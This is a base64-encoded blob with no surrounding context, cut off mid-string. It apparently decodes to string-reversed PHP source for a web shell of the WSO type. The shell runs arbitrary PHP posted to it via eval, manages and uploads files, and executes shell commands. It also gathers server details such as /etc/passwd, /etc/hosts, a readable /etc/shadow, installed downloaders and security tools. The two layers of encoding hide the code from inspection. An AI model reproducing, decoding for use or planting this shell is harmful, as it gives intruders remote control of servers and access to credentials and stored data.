IAosJ1Vpc20hPitdPl5bZ21pPCEnICAgICAgICAgICAgCiwnVWlzbSF9KSouKHsgaHQgLGR0IScgICAgICAgICAgICAKLCdVaXNtIX0qLnsgKTJoICwxaCAsaHQgLGR0ICx5ZG9ifCt3XDphfHlkb2IoIScgICAgICAgICAgICAKKCB5YXJyYShlY2FscGVyX2dlcnAgPSBwbXQkICAgICAgICAKOykobmFlbGNfdGVnX2JvID0gcG10JAkJCjspKG9mbmlwaHAJCQo7KSh0cmF0c19ibwkJCjsnPmVseXRzLzx9OzAwMCM6cm9sb2N7IHAuPmVseXRzPD50bmV0bm9jPXNzYWxjIHZpZDw+MWgvPG9mbmkgUEhQPjFoPCcgb2hjZQkJCnsgKSknb2ZuaScgPT0gXScycCdbVFNPUF8kKCAmJiApXScycCdbVFNPUF8kKHRlc3NpKGZpCQo7KShyZWRhZUhvc3cJCgo7KTAgLCd4YWphJyAuICldJ1RTT0hfUFRUSCdbUkVWUkVTXyQoNWRtKGVpa29vY3Rlc09TVyAgICAgICAgCikpXScxcCdbVFNPUF8kKHl0cG1lISAmJiApXSd4YWphJ1tUU09QXyQoeXRwbWUoZmkgICAgCn0JCjt0aXhlCQkKO3BtZXQkICwiblwiICwpcG1ldCQobmVscnRzIG9oY2UJCQo7Im5cOyciIC4gKSIwXCdcXHRcclxuXCIgLCkpKG5hZWxjX3RlZ19ibyhzcmFoY2xhaWNlcHNsbXRoKHNlaHNhbHNjZGRhIC4gIic9TE1USHJlbm5pLikndHVwdHVPcGhQJyhkSXlCdG5lbWVsRXRlZy50bmVtdWNvZDsnJz15YWxwc2lkLmVseXRzLikndHVwdHVPcGhQJyhkSXlCdG5lbWVsRXRlZy50bmVtdWNvZCIgPSBwbWV0JAkJCjspXScxcCdbVFNPUF8kKGxhdmUJCQo7KSh0cmF0c19ibwkJCjspZXVydCAsJ3hhamEnIC4gKV0nVFNPSF9QVFRIJ1tSRVZSRVNfJCg1ZG0oZWlrb29jdGVzT1NXICAgICAgICAKeyApKV0neGFqYSdbVFNPUF8kKHRlc3NpKGZpCQp7ICkocGhQbm9pdGNhIG5vaXRjbnVmCgp9CjspKHJldG9vRm9zdwkKOyc+dmlkLzwnIG9oY2UJCn0JCjspKSdyZXN1IHRlbicoeEVvc3csJ3N0bnVvY2NBIHJlc1UnKG1hcmFQY2VTb3N3CQkKOykpJ3N0bnVvY2NhIHRlbicoeEVvc3csJ3Nnbml0dGVTIHRudW9jY0EnKG1hcmFQY2VTb3N3CQkKOykpJ3JldicoeEVvc3csJ25vaXNyZVYgU08nKG1hcmFQY2VTb3N3CQkKeyBlc2xlIH0JCn0gICAgICAgICAgICAKfSAgICAgICAgICAgICAgICAKOylwbWV0JCAsJ3NyZXNVJyhtYXJhUGNlU29zdyAgICAgICAgICAgICAgICAgICAgCjsnPi9yYjwnIG9oY2UgICAgICAgICAgICAgICAgICAgIAp9ICAgICAgICAgICAgICAgICAgICAKOyJuXCIuKWRpdSQsJzonKG5pb2ogPS4gcG1ldCQgICAgICAgICAgICAgICAgICAgICAgICAgICAgCilkaXUkKCBmaSAgICAgICAgICAgICAgICAgICAgICAgIAo7KV0nMnAnW1RTT1BfJChkaXV3cHRlZ194aXNvcEAgPSBkaXUkICAgICAgICAgICAgICAgICAgICAgICAgCnsgKSsrXScycCdbVFNPUF8kO10nM3AnW1RTT1BfJCA9PCBdJzJwJ1tUU09QXyQ7KHJvZiAgICAgICAgICAgICAgICAgICAgCjsiIiA9IHBtZXQkICAgICAgICAgICAgICAgICAgICAKeyApKV0nM3AnW1RTT1BfJChjaXJlbXVuX3NpICYmICldJzJwJ1tUU09QXyQoY2lyZW11bl9zaSAmJiApXSczcCdbVFNPUF8kICxdJzJwJ1tUU09QXyQoIHRlc3NpKCBmaSAgICAgICAgICAgICAgICAKOyc+bXJvZi88PiI+PiI9ZXVsYXYgdGltYnVzPWVweXQgdHVwbmk8PmVsYmF0Lzw+cnQvPD5kdC88PjAwMDE9ZXVsYXYgMm1hcmFwPWVtYW4gdHhldD1lcHl0IHR1cG5pPD5kdDw+ZHQvPG9UPmR0PD5ydDw+cnQvPD5kdC88PjA9ZXVsYXYgMW1hcmFwPWVtYW4gdHhldD1lcHl0IHR1cG5pPD5kdDw+ZHQvPG1vckY+ZHQ8PnJ0PD4nXDtlc2xhZiBucnV0ZXI7KWV1bGF2LjJtYXJhcC5zaWh0LGV1bGF2LjFtYXJhcC5zaWh0LCI1IixsbHVuLGxsdW4oZydcPXRpbWJ1c25vIG1yb2Y8PmVsYmF0PD5uYXBzLzwpZHdzc2FwL2N0ZS8gImRhZVIiKCBkaXV3cHRlZ194aXNvcD5uYXBzPD4vcmI8JyBvaGNlICAgICAgICAgICAgICAgIAo7KSknc3Rzb2gvY3RlLycoc3RuZXRub2NfdGVnX2VsaWZAICwnc3Rzb0gnKG1hcmFQY2VTb3N3ICAgICAgICAgICAgICAgIAo7KSknaC0gZmQnKHhFb3N3ICwnZWNhcHMgRERIJyhtYXJhUGNlU29zdyAgICAgICAgICAgICAgICAKOyc+L3JiPCcgb2hjZSAgICAgICAgICAgICAgICAKOykpcG1ldCQsJyAsJyhlZG9scG1pICwnc3JlZGFvbG53b0QnKG1hcmFQY2VTb3N3ICAgICAgICAgICAgICAgIAo7bWV0aSQgPSBdW3BtZXQkICAgICAgICAgICAgICAgICAgICAgICAgCikpbWV0aSQoaGNpaFdvc3coZmkgICAgICAgICAgICAgICAgICAgIAopbWV0aSQgc2Egc3JlZGFvbG53b2QkKCBoY2Flcm9mICAgICAgICAgICAgICAgIAo7KSh5YXJyYT1wbWV0JCAgICAgICAgICAgICAgICAKOykpcG1ldCQsJyAsJyhlZG9scG1pICwncmVnbmFEJyhtYXJhUGNlU29zdyAgICAgICAgICAgICAgICAKO21ldGkkID0gXVtwbWV0JCAgICAgICAgICAgICAgICAgICAgICAgIAopKW1ldGkkKGhjaWhXb3N3KGZpICAgICAgICAgICAgICAgICAgICAKKW1ldGkkIHNhIHJlZ25hZCQoIGhjYWVyb2YgICAgICAgICAgICAgICAgCjspKHlhcnJhPXBtZXQkICAgICAgICAgICAgICAgIAo7KSlwbWV0JCwnICwnKGVkb2xwbWkgLCdsdWZyZXNVJyhtYXJhUGNlU29zdyAgICAgICAgICAgICAgICAKO21ldGkkID0gXVtwbWV0JCAgICAgICAgICAgICAgICAgICAgICAgIAopKW1ldGkkKGhjaWhXb3N3KGZpICAgICAgICAgICAgICAgICAgICAKKW1ldGkkIHNhIGx1ZnJlc3UkKCBoY2Flcm9mICAgICAgICAgICAgICAgIAo7KSh5YXJyYT1wbWV0JCAgICAgICAgICAgICAgICAKOyc+cmI8JyBvaGNlICAgICAgICAgICAgICAgIAo7KSdyb3JyaW0tcHdsJywndGVnJywnbHJ1YycsJ3NrbmlsJywneG55bCcsJ2hjdGVmJywndGVndycoeWFycmEgPSBzcmVkYW9sbndvZCQgICAgICAgICAgICAgICAgCjspJ2FqbmluJywnbmFjc21yb3cnLCdsbGltd2FzJywncGFjc2JteicsJ2tzYW1zeXMnLCdoY3Rhd2dvbCcsJ2tjZWhjZ29sJywnZGl4cycsJ2dkb2xwY3QnLCdtZGFzZGlsJywnY2Vzc28nLCd0cm9ucycsJ3lydG5lc3Ryb3AnLCdjY2RsZWlocycsJ2VyaXdwaXJ0Jywnd2ZwaScsJ3NlbGJhdHBpJywndGlrdG9vcmtoYycsJ3JldG51aGtyJywnZG1hbGMnLCdkYmV3cmQnLCd2YXMnLCduYWNzdnUnLCdkZXJvY2RiJywnMjNkb24nLCd2YWsnKHlhcnJhID0gcmVnbmFkJCAgICAgICAgICAgICAgICAKOyknbHJlcGRpdXMnLCdldGFjb2wnLCdjbicsJzJwaXpiJywncGl6YicsJ3BpemcnLCdyYXQnLCd5YnVyJywnbm9odHlwJywnbHJlcCcsJ3BocCcsJ2VrYW0nLCdkbCcsJ2NjJywnY2NsJywnY2NnJyh5YXJyYSA9IGx1ZnJlc3UkICAgICAgICAgICAgICAgIAp7ICldJ2Vkb21fZWZhcydbU0xBQk9MRyQhKGZpICAgICAgICAgICAgCjspKSd0ZW4uZXVzc2kvY3RlLycoc3RuZXRub2NfdGVnX2VsaWZAICwnZW1hbiBydHNpRCcobWFyYVBjZVNvc3cgICAgICAgICAgICAKOykpJ25vaXNyZXYvY29ycC8nKHN0bmV0bm9jX3RlZ19lbGlmQCAsJ25vaXNyZXYgU08nKG1hcmFQY2VTb3N3ICAgICAgICAgICAgCjspJ29uJzoiPmEvPF13ZWl2Wz4nKSJcd29kYWhzIlwgLCJcL2N0ZS8iXCAsIlxzbG9vVHNlbGlGIlwoZyc9a2NpbGNubyAnIyc9ZmVyaCBhPCBzZXkiPyknd29kYWhzL2N0ZS8nKGVsYmFkYWVyX3NpQCAsJ3dvZGFocy9jdGUvIGVsYmFkYWVSJyhtYXJhUGNlU29zdyAgICAgICAgICAgIAo7KSdvbic6Ij5hLzxdd2Vpdls+JykiXGR3c3NhcCJcICwiXC9jdGUvIlwgLCJcc2xvb1RzZWxpRiJcKGcnPWtjaWxjbm8gJyMnPWZlcmggYTwgc2V5Ij8pJ2R3c3NhcC9jdGUvJyhlbGJhZGFlcl9zaUAgLCdkd3NzYXAvY3RlLyBlbGJhZGFlUicobWFyYVBjZVNvc3cgICAgICAgICAgICAKeyApJ3hpbicgPT0gXSdzbydbU0xBQk9MRyQoZmkJCgo7Jz5yYjwnIG9oY2UJCjspKXBtZXQkICwnICwnKGVkb2xwbWkgLCdzZXNhYmF0YWQgZGV0cm9wcHVTJyhtYXJhUGNlU29zdwkKOyJlbGNhck8iID0gXVtwbWV0JAkJCikpJ3RjZW5ub2NfaWNvJyhzdHNpeGVfbm9pdGNudWYoZmkJCjsiTFFTZXJndHNvUCIgPSBdW3BtZXQkCQkKKSkndGNlbm5vY19ncCcoc3RzaXhlX25vaXRjbnVmKGZpCQo7IkxRU1NNIiA9IF1bcG1ldCQJCQopKSd0Y2Vubm9jX2xxc3NtJyhzdHNpeGVfbm9pdGNudWYoZmkJCjsiKSIuKShvZm5pX3RuZWlsY190ZWdfbHFzeW0uIiggbHFTeU0iID0gXVtwbWV0JAkJCikpJ29mbmlfdG5laWxjX3RlZ19scXN5bScoc3RzaXhlX25vaXRjbnVmKGZpCQo7KSh5YXJyYT1wbWV0JAkKOyknb24nOidkZWxiYW5lJz8pJ25vaXNyZXZfbHJ1Yycoc3RzaXhlX25vaXRjbnVmICwndHJvcHB1cyBMUlVjJyhtYXJhUGNlU29zdwkKOykpJ3JpZF9lZHVsY25pX2Vkb21fZWZhcycodGVnX2luaUAgLCdyaWQgZWR1bGNuaSBlZG9tIGVmYVMnKG1hcmFQY2VTb3N3CQo7KSkncmlkX2NleGVfZWRvbV9lZmFzJyh0ZWdfaW5pQCAsJ3JpZCBjZXhlIGVkb20gZWZhUycobWFyYVBjZVNvc3cJCjspKSdyaWRlc2FiX25lcG8nKHRlZ19pbmlAICwncmlkIGVzYWIgbmVwTycobWFyYVBjZVNvc3cJCjspJ2Vub24nOl0nc25vaXRjbnVmX2VsYmFzaWQnW1NMQUJPTEckP10nc25vaXRjbnVmX2VsYmFzaWQnW1NMQUJPTEckICwnc25vaXRjbnVGIFBIUCBkZWxiYXNpRCcobWFyYVBjZVNvc3cJCjspKSkoc2VsdWRvbV90ZWdfZWhjYXBhICwnICwnKGVkb2xwbWkgLCdzZWx1ZG9tIGVoY2FwQSBkZWRhb0wnKG1hcmFQY2VTb3N3ICAgICAgICAKKSknc2VsdWRvbV90ZWdfZWhjYXBhJyhzdHNpeGVfbm9pdGNudWYoZmkgICAgCjspKSdFUkFXVEZPU19SRVZSRVMnKHZuZXRlZ0AgLCdlcmF3dGZvcyByZXZyZVMnKG1hcmFQY2VTb3N3CQoKfQkKfQkJCjsnPmVycC88JyAuIHYkIC4gJz4xbG09c3NhbGMgZXJwPCcgb2hjZQkJCQkKZXNsZQkJCQo7Jz5yYjwnIC4gdiQgb2hjZQkJCQkKKWVzbGFmID09PSApIm5cIiAsdiQoc29wcnRzKGZpCQkJCjsnPm5hcHMvPCA6JyAuIG4kIC4gJz5uYXBzPCcgb2hjZQkJCQp7ICl2JChmaQkJCjspdiQobWlydCA9IHYkCQkKeyApdiQgLG4kKG1hcmFQY2VTb3N3IG5vaXRjbnVmCQo7Jz50bmV0bm9jPXNzYWxjIHZpZDw+MWgvPG5vaXRhbXJvZm5pIHl0aXJ1Y2VzIHJldnJlUz4xaDwnIG9oY2UJCjspKHJlZGFlSG9zdwkKeyApKG9mbkljZVNub2l0Y2Egbm9pdGNudWYKCn0KO2VzbGFmIG5ydXRlcgkKO2h0YXAkIG5ydXRlcgkJCikpaHRhcCQoeXRwbWUhKGZpCQo7KXAkIC4gJyBoY2lodycoeEVvc3cgPSBodGFwJAkKeyApcCQoaGNpaFdvc3cgbm9pdGNudWYKCn0KfSAgICAKO3NlbGlmJCBucnV0ZXIgICAgICAgIAo7ZW1hbmVsaWYkID0gXVtzZWxpZiQgICAgICAgICAgICAKKSkpaGQkKHJpZGRhZXIgPSBlbWFuZWxpZiQoID09ISBlc2xhZiggZWxpaHcgICAgICAgIAo7KXJpZCQocmlkbmVwbyA9ICBoZCQgICAgICAgIAp7IGVzbGUgfSAgICAKOylyaWQkKHJpZG5hY3MgbnJ1dGVyICAgICAgICAKeyApKSJyaWRuYWNzIihzdHNpeGVfbm9pdGNudWYoZmkgICAgCnsgKXJpZCQocmlkbmFjU29zdyBub2l0Y251ZgoKfQo7Jz50bm9mLzwnIC4gKSlmJChzbXJlcGVsaWZAKHNtcmVQb3N3IC4gJz4wMGZmNTIjPXJvbG9jIHRub2Y8JyBucnV0ZXIJCQplc2xlCQo7Jz50bm9mLzwnIC4gKSlmJChzbXJlcGVsaWZAKHNtcmVQb3N3IC4gJz5ldGlodz1yb2xvYyB0bm9mPCcgbnJ1dGVyCQkKKSlmJChlbGJhdGlyd19zaUAhKCBmaWVzbGUJCjsnPnRub2YvPCcgLiApKWYkKHNtcmVwZWxpZkAoc21yZVBvc3cgLiAnPjAwMDBGRiM9cm9sb2MgdG5vZjwnIG5ydXRlcgkJCikpZiQoZWxiYWRhZXJfc2lAISggZmkJCnsgKWYkKHJvbG9Dc21yZVBvc3cgbm9pdGNudWYKCn0KO2kkIG5ydXRlcgkKOykpJy0nIDogJ1QnID8gKTAwMjB4MCAmIHAkKCggOiApICd4JyA6ICd0JyA/ICkwMDIweDAgJiBwJCgoID8gKTEwMDB4MCAmIHAkKCggPS4gaSQJCjspJy0nIDogJ3cnID8gKTIwMDB4MCAmIHAkKCggPS4gaSQJCjspJy0nIDogJ3InID8gKTQwMDB4MCAmIHAkKCggPS4gaSQJCjspKSctJyA6ICdTJyA/ICkwMDQweDAgJiBwJCgoIDogKSAneCcgOiAncycgPyApMDA0MHgwICYgcCQoKCA/ICk4MDAweDAgJiBwJCgoID0uIGkkCQo7KSctJyA6ICd3JyA/ICkwMTAweDAgJiBwJCgoID0uIGkkCQo7KSctJyA6ICdyJyA/ICkwMjAweDAgJiBwJCgoID0uIGkkCQo7KSknLScgOiAnUycgPyApMDA4MHgwICYgcCQoKCA6ICkgJ3gnIDogJ3MnID8gKTAwODB4MCAmIHAkKCggPyApMDQwMHgwICYgcCQoKCA9LiBpJAkKOyknLScgOiAndycgPyApMDgwMHgwICYgcCQoKCA9LiBpJAkKOyknLScgOiAncicgPyApMDAxMHgwICYgcCQoKCA9LiBpJAkKOyd1JyA9IGkkIGVzbGUJCjsncCcgPSBpJCkwMDAxeDAgPT0gKTAwMDF4MCAmIHAkKCggZmllc2xlCQo7J2MnID0gaSQpMDAwMngwID09ICkwMDAyeDAgJiBwJCgoIGZpZXNsZQkKOydkJyA9IGkkKTAwMDR4MCA9PSApMDAwNHgwICYgcCQoKCBmaWVzbGUJCjsnYicgPSBpJCkwMDA2eDAgPT0gKTAwMDZ4MCAmIHAkKCggZmllc2xlCQo7Jy0nID0gaSQpMDAwOHgwID09ICkwMDA4eDAgJiBwJCgoIGZpZXNsZQkKOydsJyA9IGkkKTAwMEF4MCA9PSApMDAwQXgwICYgcCQoKCBmaWVzbGUJCjsncycgPSBpJCkwMDBDeDAgPT0gKTAwMEN4MCAmIHAkKCggZmkJCnsgKXAkKHNtcmVQb3N3IG5vaXRjbnVmCgp9CjsnQiAnIC4gcyQgbnJ1dGVyCQkKZXNsZQkKOydCSyAnIC4gKSA0MjAxIC8gcyQgLCdmMi4xJScoZnRuaXJwcyBucnV0ZXIJCQopNDIwMSA9PiBzJChmaWVzbGUJCjsnQk0gJyAuICkgNjc1ODQwMSAvIHMkICwnZjIuMSUnKGZ0bmlycHMgbnJ1dGVyCQkKKTY3NTg0MDEgPT4gcyQoZmllc2xlCQo7J0JHICcgLikgNDI4MTQ3MzcwMSAvIHMkICwnZjIuMSUnKGZ0bmlycHMgbnJ1dGVyCQkKKTQyODE0NzM3MDEgPT4gcyQoZmkJCiAgICAKOylzJCAsInUlIihmdG5pcnBzID0gcyQgICAgICAgIAopKXMkKHRuaV9zaSggZmkgICAgCnsgKXMkKGV6aVN3ZWlWb3N3IG5vaXRjbnVmCgp9Cjt0dW8kIG5ydXRlcgkKfQkKOylmJChlc29sY3AJCQo7KTQyMDEsZiQoZGFlcmYgPS4gdHVvJAkJCQopKWYkKGZvZWZAIShlbGlodwkJCjsiIiA9IHR1byQJCQp7ICkpKSJyIixuaSQobmVwb3BAID0gZiQoZWNydW9zZXJfc2koIGZpZXNsZSB9CQo7KW5pJChjZXhlX2xsZWhzID0gdHVvJAkJCnsgKSknY2V4ZV9sbGVocycoc3RzaXhlX25vaXRjbnVmKCBmaWVzbGUgfQkKOykobmFlbGNfdGVnX2JvID0gdHVvJAkJCjspbmkkKG1ldHN5c0AJCQo7KSh0cmF0c19ibwkJCnsgKSknbWV0c3lzJyhzdHNpeGVfbm9pdGNudWYoIGZpZXNsZSB9CQo7KShuYWVsY190ZWdfYm8gPSB0dW8kCQkKOyluaSQodXJodHNzYXBACQkKOykodHJhdHNfYm8JCQp7ICkpJ3VyaHRzc2FwJyhzdHNpeGVfbm9pdGNudWYoIGZpZXNsZSB9CQo7KXR1byQsIm5cIihuaW9qQCA9IHR1byQJCQo7KXR1byQsbmkkKGNleGVACQkKeyApKSdjZXhlJyhzdHNpeGVfbm9pdGNudWYoIGZpCQo7JycgPSB0dW8kCQp7ICluaSQoeEVvc3cgbm9pdGNudWYKCn0gfTtlc2xhZiBucnV0ZXJ7IClwJChkaWdyZ3RlZ194aXNvcCBub2l0Y251ZiAgICAKeyApKWVzbGFmPT09KSdkaWdyZ3RlZ194aXNvcCcgLF0nc25vaXRjbnVmX2VsYmFzaWQnW1NMQUJPTEckKHNvcHJ0cyggJiYgKSJkaWdyZ3RlZ194aXNvcCIoc3RzaXhlX25vaXRjbnVmISggZmkKfSB9O2VzbGFmIG5ydXRlcnsgKXAkKGRpdXdwdGVnX3hpc29wIG5vaXRjbnVmICAgIAp7ICkpZXNsYWY9PT0pJ2RpdXdwdGVnX3hpc29wJyAsXSdzbm9pdGNudWZfZWxiYXNpZCdbU0xBQk9MRyQoc29wcnRzKCAmJiApImRpdXdwdGVnX3hpc29wIihzdHNpeGVfbm9pdGNudWYhKCBmaQoKfQo7Ij5sbXRoLzw+eWRvYi88PnZpZC88PmVsYmF0Lzw+cnQvPAkKPmR0Lzw+ICByYjw+bXJvZi88Pic+Pic9ZXVsYXYgdGltYnVzPWVweXQgdHVwbmk8PmY9ZW1hbiBlbGlmPWVweXQgJ3BuSXNsb290Jz1zc2FsYyB0dXBuaTw+cmI8ZWxiYXRpcndfc2kkPm5hcHMvPDplbGlmIGRhb2xwVT5uYXBzPAkJCj4nIiAuICknJzpdJ3Rlc3JhaGMnW1RTT1BfJD8pXSd0ZXNyYWhjJ1tUU09QXyQodGVzc2koIC4gIic9ZXVsYXYgdGVzcmFoYz1lbWFuIG5lZGRpaD1lcHl0IHR1cG5pPAkJCj4nZWxpRmRhb2xwdSc9ZXVsYXYgMXA9ZW1hbiBuZWRkaWg9ZXB5dCB0dXBuaTwJCQo+JyIuIF0nZHdjJ1tTTEFCT0xHJCAuICInPWV1bGF2IGM9ZW1hbiBuZWRkaWg9ZXB5dCB0dXBuaTwJCQo+J25BTXNlbGlGJz1ldWxhdiBhPWVtYW4gbmVkZGloPWVweXQgdHVwbmk8CQkKPidhdGFkLW1yb2YvdHJhcGl0bHVtJz1FUFlUQ05FICd0c29wJz1kb2h0ZW0gbXJvZjw+ZHQ8CQkKPmR0Lzw+bXJvZi88Pic+Pic9ZXVsYXYgdGltYnVzPWVweXQgdHVwbmk8PicnPWV1bGF2IGM9ZW1hbiB0eGV0PWVweXQgJ3BuSXNsb290Jz1zc2FsYyB0dXBuaTw+cmI8Pm5hcHMvPDpldHVjZXhFPm5hcHM8PiJcO2VzbGFmIG5ydXRlcjspZXVsYXYuYy5zaWh0LGxsdW4sJ2Vsb3Nub0MnKGciXD10aW1idXNubyBtcm9mPD5kdDwJCQo+cnQ8PnJ0LzwJCj5kdC88Pm1yb2YvPD4nPj4nPWV1bGF2IHRpbWJ1cz1lcHl0IHR1cG5pPD5mPWVtYW4gdHhldD1lcHl0ICdwbklzbG9vdCc9c3NhbGMgdHVwbmk8PnJiPGVsYmF0aXJ3X3NpJD5uYXBzLzw6ZWxpZiBla2FNPm5hcHM8PiJcO2VzbGFmIG5ydXRlcjspJ2VsaWZrbScsZXVsYXYuZi5zaWh0LGxsdW4sJ3Nsb29Uc2VsaUYnKGciXD10aW1idXNubyBtcm9mPD5kdDwJCQo+ZHQvPD5tcm9mLzw+Jz4+Jz1ldWxhdiB0aW1idXM9ZXB5dCB0dXBuaTw+ZD1lbWFuIHR4ZXQ9ZXB5dCAncG5Jc2xvb3QnPXNzYWxjIHR1cG5pPD5yYjxlbGJhdGlyd19zaSQ+bmFwcy88OnJpZCBla2FNPm5hcHM8PiJcO2VzbGFmIG5ydXRlcjspZXVsYXYuZC5zaWh0LCdyaWRrbScsbGx1biwnbmFNc2VsaUYnKGciXD10aW1idXNubyBtcm9mPD5kdDwJCQo+cnQ8PnJ0LzwJCj5kdC88Pm1yb2YvPD4nPj4nPWV1bGF2IHRpbWJ1cz1lcHl0IHR1cG5pPD5mPWVtYW4gdHhldD1lcHl0ICdwbklzbG9vdCc9c3NhbGMgdHVwbmk8PnJiPD5uYXBzLzw6ZWxpZiBkYWVSPm5hcHM8PiJcO2VzbGFmIG5ydXRlcjspZXVsYXYuZi5zaWh0LGxsdW4sJ3Nsb29Uc2VsaUYnKGciXD10aW1idXNubyBtcm9mPD5kdDwJCQo+ZHQvPD5tcm9mLzw+Jz4+Jz1ldWxhdiB0aW1idXM9ZXB5dCB0dXBuaTw+JyIuICldJ2R3YydbU0xBQk9MRyQoc3JhaGNsYWljZXBzbG10aCAuICInPWV1bGF2IGM9ZW1hbiB0eGV0PWVweXQgJ3BuSXNsb290Jz1zc2FsYyB0dXBuaTw+cmI8Pm5hcHMvPDpyaWQgZWduYWhDPm5hcHM8Pic7ZXNsYWYgbnJ1dGVyOykiXCJcLGV1bGF2LmMuc2lodCxsbHVuKGcnPXRpbWJ1c25vIG1yb2Y8PmR0PAkJCj5ydDwJCj4nOzMzMyMgZGlsb3MgeHAyOm1vdHRvYi1yZWRyb2I7MzMzIyBkaWxvcyB4cDI6cG90LXJlZHJvYic9ZWx5dHMgICUwMDE9aHRkaXcgMD1nbmljYXBzbGxlYyAzPWduaWRkYXBsbGVjIGxiVHNsb290PWRpIG9mbmk9c3NhbGMgZWxiYXQ8Cj52aWQvPAoiIG9oY2UgICAgCjsiPnRub2YvPCllbGJhdGlydyB0b04oPmRlcj1yb2xvYyB0bm9mPCAiOiI+dG5vZi88KWVsYmFldGlyVyg+J25lZXJnJz1yb2xvYyB0bm9mPCAiPyldJ2R3YydbU0xBQk9MRyQoZWxiYXRpcndfc2kgPSBlbGJhdGlyd19zaSQJCnsgKShyZXRvb0Zvc3cgbm9pdGNudWYKCn0KOyc+IjU6bmlncmFtIj1lbHl0cyB2aWQ8PmVsYmF0Lzw+cnQvPCcgLiB1bmVtJCAuICc+cnQ8PiUwMDE9aHRkaXcgMD1nbmljYXBzbGxlYyAzPWduaWRkYXBsbGVjICI7MzMzIyBkaWxvcyB4cDI6cG90LXJlZHJvYiI9ZWx5dHMgZWxiYXQ8JyAuICAgICAgIAonPmVsYmF0Lzw+cnQvPD5kdC88PnJib24vPCcgLiBdJ1JEREFfRVRPTUVSJ1tSRVZSRVNfJCAuICc+cmI8Pm5hcHMvPDpQSSB0bmVpbEM+bmFwczw+cmI8JyAuIF0iUkREQV9SRVZSRVMiW1JFVlJFU18kQCAuICc+cmI8Pm5hcHMvPDpQSSByZXZyZVM+bmFwczw+cmI8PnRjZWxlcy88PnB1b3JndHBvLzwnIC4gc3Rlc3JhaGNfdHBvJCAuICc+InRlc3JhaGMgZWdhUCI9bGViYWwgcHVvcmd0cG88PiIpZXVsYXYuc2lodCxsbHVuLGxsdW4sbGx1bixsbHVuLGxsdW4oZyI9ZWduYWhjbm8gdGNlbGVzPD5yYm9uPD50aGdpcj1uZ2lsYSAxPWh0ZGl3IGR0PCcgLiAgICAgICAKJz5kdC88JyAuIHNldmlyZCQgLiAnPnJiPD5hLzxdIGVtb2ggWz4iKSdcJ1wsJ1wnXCwnXCdcLCdcJyAuIF0nZHdjX2Vtb2gnW1NMQUJPTEckIC4gJydcLCdcbmFNc2VsaUYnXChnIj1rY2lsY25vICM9ZmVyaCBhPCAnIC4gKV0nZHdjJ1tTTEFCT0xHJChyb2xvQ3NtcmVQb3N3IC4nICcgLiBza25pbF9kd2MkIC4gJz5yYjwpJScgLiApMDAxKmVjYXBTbGF0b3QkL2VjYXBTZWVyZiQoICl0bmkoIC4nKCAnIC4gKWVjYXBTZWVyZiQoZXppU3dlaVZvc3cgLiAnID5uYXBzLzw6ZWVyRj5uYXBzPCAnIC4gKWVjYXBTbGF0b3QkKGV6aVN3ZWlWb3N3IC4gJz5yYjwnIC4gKSdzOmk6SCBkLW0tWScoZXRhZCAuICcgPm5hcHMvPDplbWl0ZXRhRD5uYXBzPCA+YS88XSBvZm5pcGhwIFs+IiknXG9mbmknXCwnXCdcLGxsdW4sJ1xwaFAnXChnIj1rY2lsY25vICM9ZmVyaCBhPCAnIC4gICAgICAgCiknPnRub2YvPD5iLzxGRk8+Yjw+bmVlcmc9cm9sb2MgdG5vZjwnOic+dG5vZi88Tk8+ZGVyPXJvbG9jIHRub2Y8Jz9dJ2Vkb21fZWZhcydbU0xBQk9MRyQoIC4gJyA+bmFwcy88OmVkb20gZWZhUz5uYXBzPCAnIC4gKShub2lzcmV2cGhwQCAuICc+cmI8KSAnIC4gcHVvcmckIC4gJyAoICcgLiBkaWckIC4gJyA+bmFwcy88OnB1b3JHPm5hcHM8ICkgJyAuIHJlc3UkIC4gJyAoICcgLiBkaXUkIC4gJz5yYjw+cmJvbi88JyAuICkwMjEgLDAgLCkoZW1hbnVfcGhwQChydHNidXMgLiAnPnJib248PmR0PCcgLiAgICAgICAKJz5kdC88Pm5hcHMvPCcgLiApJyc6JzpzZXZpckQ+cmI8Jz8nbml3JyA9PSBdJ3NvJ1tTTEFCT0xHJCggLiAnOmR3Qz5yYjw6ZGRIPnJiPDpwaFA+cmI8OnJlc1U+cmI8OmVtYW5VPm5hcHM8PjE9aHRkaXcgZHQ8PnJ0PD4lMDAxPWh0ZGl3IDA9Z25pY2Fwc2xsZWMgMz1nbmlkZGFwbGxlYyBvZm5pPXNzYWxjIGVsYmF0PCcgb2hjZQkKfQkKOycgPmEvPF0gJy5ldmlyZCQuJyBbPiIpJ1wvOicuZXZpcmQkLicnXCwnXG5hTXNlbGlGJ1woZyI9a2NpbGNubyAiIyI9ZmVyaCBhPCcgPS4gc2V2aXJkJAkJCQopKSdcXDonLmV2aXJkJChyaWRfc2koZmkJCQopZXZpcmQkIHNhICkneicsJ2MnKGVnbmFyKGhjYWVyb2YJCQp7ICknbml3JyA9PSBdJ3NvJ1tTTEFCT0xHJChmaQkKOyIiID0gc2V2aXJkJAkKfQkKfQkJCjsnPmh0LzxdID5hLzwnLmskLic+IiknXCdcLCdcJ1wsJ1wnXCxsbHVuLCdcJy52JC4nJ1woZyI9a2NpbGNubyAiIyI9ZmVyaCBhPCBbPiIlJy4pKW0kKHRudW9jLzAwMSgpdG5pKC4nIj1odGRpdyBodDwnID0uIHVuZW0kCQkJCntlc2xlfQkJCjsnPmh0LzxdID5hLzw+dG5vZi88Jy5rJC4nPiIwMGZmNTIjIj1yb2xvYyB0bm9mPD4iKSdcJ1wsJ1wnXCwnXCdcLGxsdW4sJ1wnLnYkLicnXChnIj1rY2lsY25vICIjIj1mZXJoIGE8IFs+IiUnLikpbSQodG51b2MvMDAxKCl0bmkoLiciPWh0ZGl3IGh0PCcgPS4gdW5lbSQJCQkKeyknZWRhcmdQVS9ldGFkUFUnID09IGskKGZpCQkKeyl2JCA+PSBrJCBzYSBtJChoY2Flcm9mCQo7JycgPSB1bmVtJAkKOydldm9tZVJmbGVTJyA9IF0nZXZvbWVyIGZsZVMnW20kCQo7J3R1b2dvTCcgPSBdJ3R1b2dvTCdbbSQJCQopKV0nc3NhcF9odHVhJ1tTTEFCT0xHJCh5dHBtZSEoZmkJCjspJ2tyb3d0ZU4nPj0na3Jvd3RlTicsJ2Vjcm9mZXR1ckInPj0nZWNyb2ZldHVyQicsJ3Nsb29UZ25pcnRTJz49J3Nsb290IGduaXJ0UycgLCdwaFAnPj0ncGhQJyAsJ2V0YURQVScgPj0gJ2VkYXJnUFUvZXRhZFBVJyAsJ2xxUyc+PSdscVMnLCdlbG9zbm9DJz49J2Vsb3Nub0MnICwnbmFNc2VsaUYnPj0nc2Vsa